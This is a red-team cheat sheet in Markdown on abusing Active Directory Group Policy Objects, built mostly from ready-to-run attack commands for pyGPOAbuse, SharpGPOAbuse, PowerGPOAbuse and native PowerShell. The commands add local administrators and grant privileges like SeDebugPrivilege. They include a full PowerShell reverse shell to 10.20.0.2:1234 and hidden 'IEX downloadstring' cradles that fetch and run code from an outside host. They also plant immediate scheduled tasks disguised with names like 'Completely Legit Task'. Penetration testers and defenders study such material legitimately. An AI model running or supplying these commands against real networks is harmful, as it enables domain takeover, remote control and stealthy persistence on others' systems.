<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# GPO Abuse
## Overview
* <details><summary>Requirements (Click to expand)</summary><p>
	* WriteProperty to the GPC-File-Sys-Path property of a GPO (specific GUID specified)
	* GenericAll, GenericWrite, WriteProperty to any property (no GUID specified)
	* WriteDacl, WriteOwner

## Attacks
### From a Linux Machine

* <details><summary>pyGPOAbuse [https://github.com/Hackndo/pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) (Click to expand)</summary><p>
	* Examples
		* Example 1: update an existing GPO, Add a local administrator (Default Functionality)

				./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
		* Example 2: Establish a reverse shell

				./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
				    -powershell \ 
				    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
				    -taskname "Completely Legit Task" \
				    -description "Dis is legit, pliz no delete" \ 
				    -user
* Recommended to avoid in production cases: GPOwned


### From a Windows Machine

* .NET
	* <details><summary>SharpGPOAbuse (Click to expand)</summary><p>
		* Examples
			* Example 1: Build and configure SharpGPOAbuse

					$ git clone https://github.com/FSecureLABS/SharpGPOAbuse
					$ Install-Package CommandLineParser -Version 1.9.3.15
					$ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
			* Example 2: Adding User Rights

					.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
			* Example 3: Adding a Local Admin

					.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
			* Example 4: Configuring a User or Computer Logon Script

					.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
			* Example 5: Configuring a Computer or User Immediate Task. Note: Intended to "run once" per GPO refresh, not run once per system

					.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
					.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
* PowerShell
	* <details><summary>PowerGPOAbuse (Click to expand) -<br />[https://github.com/rootSySdk/PowerGPOAbuse](https://github.com/rootSySdk/PowerGPOAbuse)</summary><p>
		* Initiate

				PS> . .\PowerGPOAbuse.ps1
		* Examples
			* Example 1: Adding a localadmin 

					PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
			* Example 2: Assign a new right 

					PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
			* Example 3: Adding a New Computer/User script 

					PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
 			* Example 4: Create an immediate task 

					PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
	* Native
		* Immediate Scheduled Task
			* <details><summary>Process (Click to expand)</summary><p>
				1. An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to.

						New-GPOImmediateTask -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command powershell -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMA[...]BOz4=='
				1. Another example of exploitation could be to add a user to the local administrators group.

						New-GPOImmediateTask -Verbose -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command cmd -CommandArguments "/c net localgroup administrators shutdown /add"
				1. After a successful execution, the scheduled task can be removed with the following command.

						New-GPOImmediateTask -Force -Remove -GPODisplayName 'GPODisplayName'
				1. Optional: Force Group Policy Update (Occurs every 90 minutes otherwise)

						gpupdate /force